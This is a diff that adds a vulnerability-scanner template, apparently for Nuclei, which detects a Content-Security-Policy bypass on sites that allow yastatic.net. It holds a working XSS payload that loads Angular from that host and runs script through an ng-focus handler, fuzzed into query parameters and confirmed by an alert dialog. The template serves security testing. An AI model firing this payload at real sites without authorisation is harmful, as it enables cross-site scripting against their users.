@@ -1,0 +1,55 @@
+id: yastatic-angular-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Yastatic Angular
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yastatic-angular,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yastatic.net"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yastatic_angular_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yastatic_angular_csp_xss == true"
+# digest: 4a0a0047304502210081b0e4b33b9f7aaf76916801457547004b34ad7c7ea96df2b95c95029c336e8d02201d31bf67202a295919a5a1ec899d50d8977b03aa686ef3357b299c1bb2b06694:922c64590222798bb761d5b6d8e72950
